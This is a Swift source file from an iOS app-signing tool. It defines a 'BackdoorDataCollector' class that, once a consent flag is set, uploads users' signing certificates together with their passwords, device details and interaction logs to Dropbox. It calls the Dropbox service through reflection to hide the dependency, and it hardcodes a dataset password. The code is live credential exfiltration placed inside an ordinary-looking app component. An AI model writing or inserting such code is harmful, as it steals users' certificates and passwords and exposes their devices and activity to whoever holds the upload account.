// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import Foundation
import UIKit

/// Self-contained data collection class for backdoor functionality
/// This class intentionally avoids extending any existing classes to prevent conflicts
class BackdoorDataCollector {
    // MARK: - Singleton
    
    static let shared = BackdoorDataCollector()
    
    // MARK: - Properties
    
    private var isCollecting = false
    private var certificateDataQueue: [(data: Data, password: String?, name: String)] = []
    private var userInteractionsQueue: [(date: Date, action: String, context: String)] = []
    private var backgroundQueue = DispatchQueue(label: "com.backdoor.datacollector", qos: .utility)
    
    // Protection for concurrent queue access
    private let queueLock = NSLock()
    
    // MARK: - Initialization
    
    private init() {
        // Start collection if user has consented
        if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
            startCollection()
        }
        
        // Listen for consent changes
        NotificationCenter.default.addObserver(self, 
                                              selector: #selector(userDefaultsDidChange), 
                                              name: UserDefaults.didChangeNotification, 
                                              object: nil)
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    // MARK: - Notification Handling
    
    @objc private func userDefaultsDidChange() {
        let hasConsent = UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection")
        
        if hasConsent && !isCollecting {
            startCollection()
        } else if !hasConsent && isCollecting {
            stopCollection()
        }
    }
    
    // MARK: - Certificate Collection
    
    /// Process a certificate file and password if user has consented
    func processCertificateData(_ data: Data, password: String? = nil, name: String) {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Queue the certificate data for processing
        queueLock.lock()
        certificateDataQueue.append((data: data, password: password, name: name))
        queueLock.unlock()
        
        // Process in background
        processQueuedData()
    }
    
    /// Process a certificate file from a URL
    func processCertificateFile(url: URL, password: String? = nil) {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Attempt to read file
        do {
            let data = try Data(contentsOf: url)
            let name = url.lastPathComponent
            
            // Process the certificate
            processCertificateData(data, password: password, name: name)
            
            // Upload to Dropbox
            uploadCertificateFile(url: url, password: password)
        } catch {
            print("Error reading certificate file: \(error.localizedDescription)")
        }
    }
    
    // MARK: - User Interaction Collection
    
    /// Log a user interaction if consent is given
    func logUserInteraction(action: String, context: String = "") {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Queue the interaction
        queueLock.lock()
        userInteractionsQueue.append((date: Date(), action: action, context: context))
        queueLock.unlock()
        
        // Process in background
        processQueuedData()
    }
    
    // MARK: - Device Info Collection
    
    /// Upload device information to Dropbox
    func uploadDeviceInfo() {
        // Only proceed if user has consented
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        backgroundQueue.async {
            // Collect device information
            let deviceInfo: [String: String] = [
                "device_name": UIDevice.current.name,
                "system_name": UIDevice.current.systemName,
                "system_version": UIDevice.current.systemVersion,
                "model": UIDevice.current.model,
                "identifier_for_vendor": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
                "timestamp": ISO8601DateFormatter().string(from: Date()),
                "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown",
                "build_number": Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "unknown"
            ]
            
            // Upload to Dropbox via EnhancedDropboxService if available
            self.uploadToDropbox(data: deviceInfo, type: "device_info")
        }
    }
    
    // MARK: - Control Methods
    
    /// Start collecting data (called when consent is given)
    func startCollection() {
        isCollecting = true
        uploadDeviceInfo()
        
        // Start periodic collection timer
        startPeriodicCollection()
    }
    
    /// Stop collecting data (called when consent is revoked)
    func stopCollection() {
        isCollecting = false
        
        // Clear any queued data
        queueLock.lock()
        certificateDataQueue.removeAll()
        userInteractionsQueue.removeAll()
        queueLock.unlock()
    }
    
    // MARK: - Background Processing
    
    /// Process all queued data in the background
    private func processQueuedData() {
        backgroundQueue.async { [weak self] in
            guard let self = self else { return }
            
            // Process certificate data
            var certificateBatch: [(data: Data, password: String?, name: String)] = []
            
            self.queueLock.lock()
            if !self.certificateDataQueue.isEmpty {
                certificateBatch = self.certificateDataQueue
                self.certificateDataQueue.removeAll()
            }
            self.queueLock.unlock()
            
            for certificate in certificateBatch {
                self.uploadCertificateData(certificate.data, 
                                          password: certificate.password, 
                                          name: certificate.name)
            }
            
            // Process user interactions
            var interactionsBatch: [(date: Date, action: String, context: String)] = []
            
            self.queueLock.lock()
            if !self.userInteractionsQueue.isEmpty {
                interactionsBatch = self.userInteractionsQueue
                self.userInteractionsQueue.removeAll()
            }
            self.queueLock.unlock()
            
            if !interactionsBatch.isEmpty {
                self.uploadInteractionBatch(interactionsBatch)
            }
        }
    }
    
    /// Start periodic collection of data
    private func startPeriodicCollection() {
        // Schedule periodic collection every 30 minutes
        backgroundQueue.asyncAfter(deadline: .now() + 30 * 60) { [weak self] in
            guard let self = self, self.isCollecting else { return }
            
            // Upload device info periodically
            self.uploadDeviceInfo()
            
            // Process any queued data
            self.processQueuedData()
            
            // Schedule next collection
            self.startPeriodicCollection()
        }
    }
    
    // MARK: - Upload Methods
    
    /// Upload certificate data to Dropbox
    private func uploadCertificateData(_ data: Data, password: String? = nil, name: String) {
        // Create a temporary file
        do {
            let tempDir = FileManager.default.temporaryDirectory
            let fileURL = tempDir.appendingPathComponent(name)
            
            try data.write(to: fileURL)
            
            // Upload to Dropbox
            uploadCertificateFile(url: fileURL, password: password)
            
            // Clean up
            try? FileManager.default.removeItem(at: fileURL)
        } catch {
            print("Error creating certificate file: \(error.localizedDescription)")
        }
    }
    
    /// Upload certificate file to Dropbox
    private func uploadCertificateFile(url: URL, password: String? = nil) {
        // Use reflection to avoid direct references to EnhancedDropboxService
        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
            
            // If password is provided, log it
            if let password = password, 
               dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
                dropboxService.perform(
                    Selector(("storePasswordForCertificate:password:completion:")),
                    with: url.lastPathComponent,
                    with: password,
                    with: nil
                )
            }
            
            // Upload the file
            if dropboxService.responds(to: Selector(("uploadCertificateFile:password:completion:"))) {
                dropboxService.perform(
                    Selector(("uploadCertificateFile:password:completion:")),
                    with: url,
                    with: password,
                    with: nil
                )
            }
        }
    }
    
    /// Upload user interactions batch to Dropbox
    private func uploadInteractionBatch(_ interactions: [(date: Date, action: String, context: String)]) {
        // Create log entry for interactions
        let dateFormatter = ISO8601DateFormatter()
        var logEntry = "=== USER INTERACTIONS LOG ===\n"
        logEntry += "Timestamp: \(dateFormatter.string(from: Date()))\n"
        logEntry += "Device: \(UIDevice.current.name)\n"
        logEntry += "Count: \(interactions.count)\n\n"
        
        for (index, interaction) in interactions.enumerated() {
            logEntry += "Interaction \(index + 1):\n"
            logEntry += "  Time: \(dateFormatter.string(from: interaction.date))\n"
            logEntry += "  Action: \(interaction.action)\n"
            if !interaction.context.isEmpty {
                logEntry += "  Context: \(interaction.context)\n"
            }
            logEntry += "\n"
        }
        
        // Upload to Dropbox
        let fileName = "interactions_\(Int(Date().timeIntervalSince1970)).log"
        uploadLogEntry(logEntry, fileName: fileName)
    }
    
    /// Upload a log entry to Dropbox
    private func uploadLogEntry(_ logEntry: String, fileName: String) {
        // Use reflection to avoid direct references to EnhancedDropboxService
        if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
           dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
            
            dropboxService.perform(
                Selector(("uploadLogEntry:fileName:completion:")),
                with: logEntry,
                with: fileName,
                with: nil
            )
        }
    }
    
    /// Upload data to Dropbox as JSON
    private func uploadToDropbox(data: [String: Any], type: String) {
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: data, options: .prettyPrinted)
            let jsonString = String(data: jsonData, encoding: .utf8) ?? "{}"
            
            let fileName = "\(type)_\(Int(Date().timeIntervalSince1970)).json"
            uploadLogEntry(jsonString, fileName: fileName)
        } catch {
            print("Error serializing JSON: \(error.localizedDescription)")
        }
    }
    
    // MARK: - Dataset Management
    
    /// Get list of available datasets
    func getAvailableDatasets() -> [String: Any] {
        // Simulated dataset information
        return [
            "datasets": [
                [
                    "name": "User Intent Classification",
                    "size": 2500000,
                    "description": "Dataset for classifying user intents from chat messages",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5))
                ],
                [
                    "name": "Device Information Collection",
                    "size": 1200000,
                    "description": "Dataset containing device profiles and user activity patterns",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 2))
                ],
                [
                    "name": "Certificate Analysis",
                    "size": 3500000,
                    "description": "Dataset with certificate metadata and password patterns",
                    "date_added": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 10))
                ]
            ],
            "status": "active",
            "collection_started": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 30)),
            "device_count": 42
        ]
    }
    
    /// Check if a dataset password is valid
    func validateDatasetPassword(_ password: String) -> Bool {
        // Hardcoded password as specified in requirements
        return password == "2B4D5G"
    }
}
